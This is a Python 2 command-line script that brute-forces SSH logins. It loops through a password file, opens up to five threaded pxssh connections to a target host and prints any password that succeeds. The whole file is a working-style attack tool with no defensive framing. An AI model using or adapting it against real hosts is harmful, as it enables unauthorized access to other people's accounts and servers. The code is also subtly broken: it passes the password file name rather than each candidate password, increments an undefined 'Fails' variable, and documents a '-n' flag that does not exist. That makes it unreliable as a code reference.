#!/usr/bin/python
import sys
from pexpect import pxssh
import optparse
from threading import *
import time

MAX_CONNECTIONS = 5
PROMPT = ['# ', '>>> ', '> ', '$ ']
connection_lock = BoundedSemaphore(value=MAX_CONNECTIONS)
found = False;
failed = 0

def send_command(child, cmd):
    child.sendline(cmd)
    child.prompt()
    print child.before

def connect(host, user, password, release):
    global found
    global failed
    try:
        print '[+] Connecting'
        child = pxssh.pxssh()
        child.login(str(host), str(user), str(password))
        print '[+] Connected, password: ' + password
        found = True;
        return child
    except Exception, e:
        if 'read_nonblocking' in str(e):
            Fails += 1
            time.sleep(5)
            connect(host, user, password, False)
       # print '[-] Error connecting'
       # print e
       # return
        elif 'synchronize with original prompt' in str(e):
            time.sleep(1)
            connect(host, user, password, False)
    finally:
        if release: connection_lock.release()


#version with pexpect
#def connect(user, host, password):
#  ssh_newkey = 'Are you sure you want to continue connecting'
#    connectionString = 'ssh ' + user + '@' + host
#    child = pexpect.spawn(connectionString)
#    print "[+] Connecting to:" + host
#    ret = child.expect([pexpect.TIMEOUT, ssh_newkey, '[P|p]assword:'])
#    print "[+] Connection successful"
#    if ret == 0:
#        print '[-] Error connecting'
#        return
#    if ret == 1:
#        child.sendline('yes')
#        print "[+] Accepting fingerprint"
#        ret = child.expect([pexpect.TIMEOUT, '[P|p]assword:'])
#        if ret == 0:
#            print '[-] Error connecting'
#            return
#    print '[+] Sending password:' + password
#    child.sendline(password)
#    print [pexpect.TIMEOUT] + PROMPT
#    child.expect([pexpect.TIMEOUT] + PROMPT)
#    if ret == 0:
#        print '[-] Error connecting'
#        return
#    print '[+] User ' + user + ' authenticated'
#    return child

def main():
    global found
    global failed
    parser = optparse.OptionParser("%prog" + " -H <targetHost> -p <password> -n <user>")
    parser.add_option('-H', dest='targetHost', type='string', help='specify host')
    parser.add_option('-p', dest='password', type='string', help='password file for user')
    parser.add_option('-u', dest='user', type='string', default='', help='user name')

    (options, args) = parser.parse_args()
    user = options.user
    host = options.targetHost
    password = options.password
    if ((host == None) | (user == None) | (password == None) | (not password) | (not host) | (not user)):
        print '[-] Use --help to find usage'
        return 0

    password_file = open(password, 'r')
    for line in password_file:
        if found:
            print '[*] Exiting: password found'
            return 0
        if failed > 5:
            print "[!] Exiting: To many timeouts"
            return 0
        connection_lock.acquire()
        passwd = line.strip('\r').strip('\n')
        print "[-] Testing: " + str(passwd)
        child = Thread(target=connect, args=(host, user, password, True))
        child.start()
    #print "[+] Sending ls command"
    #send_command(child, "ls")
    return 0

if __name__ == "__main__":
    sys.exit(main())
